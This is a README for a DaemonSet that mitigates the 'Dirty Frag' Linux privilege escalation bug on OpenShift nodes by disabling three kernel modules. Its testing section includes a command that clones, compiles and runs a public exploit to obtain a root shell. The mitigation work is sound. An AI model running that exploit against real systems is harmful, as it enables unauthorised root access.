# disable-dirtyfrag

DaemonSet to mitigate the [Dirty Frag](https://github.com/V4bel/dirtyfrag) Linux privilege escalation vulnerability by disabling the `esp4`, `esp6`, and `rxrpc` kernel modules on all nodes in an OpenShift cluster.

Dirty Frag is a deterministic logic bug (no race condition) that chains two page-cache write vulnerabilities (xfrm-ESP and RxRPC) to achieve local privilege escalation. It affects approximately 9 years of kernel versions across major distributions including RHEL, Ubuntu, Fedora, CentOS, and others. No CVE has been assigned yet.

## What it does

1. Writes `/etc/modprobe.d/dirtyfrag.conf` on each node, which prevents the modules from being loaded in the future by redirecting `install` to `/bin/false`.
2. Immediately unloads the modules via `rmmod` if they are currently loaded.
3. Logs verification output confirming the config file contents and module unload status.

## Resources created

- **Namespace** `disable-dirtyfrag`
- **ServiceAccount** `disable-dirtyfrag` with a **ClusterRoleBinding** to the `privileged` SCC (required for host filesystem access and `rmmod`)
- **DaemonSet** `disable-dirtyfrag` running on all nodes (including control plane via universal toleration)

## Usage

```sh
oc apply -f disable-dirtyfrag.yaml
```

### Verify

Check logs on any node's pod to confirm the modules were unloaded:

```sh
oc logs -n disable-dirtyfrag -l app=disable-dirtyfrag
```

Expected output:

```
=== modprobe.d/dirtyfrag.conf ===
install esp4 /bin/false
install esp6 /bin/false
install rxrpc /bin/false
=== loaded modules check ===
OK: esp4 is not loaded
OK: esp6 is not loaded
OK: rxrpc is not loaded
```

### Testing the vulnerability

**Only test on systems you are authorized to access.**

Spin up a pod and run the exploit:

```sh
oc run dirtyfrag-test --rm -it --restart=Never \
  --image=registry.access.redhat.com/ubi9/ubi:latest \
  -- bash -c "dnf install -y gcc git util-linux && git clone https://github.com/V4bel/dirtyfrag.git && cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp"
```

If the system is vulnerable, the exploit will succeed and grant a root shell. Apply the mitigation, then run the same command again — it should fail because the required kernel modules can no longer be loaded.

### Cleanup

```sh
oc delete -f disable-dirtyfrag.yaml
```

Note: this removes the DaemonSet but leaves `/etc/modprobe.d/dirtyfrag.conf` in place on each node, so the modules will remain blocked from loading.
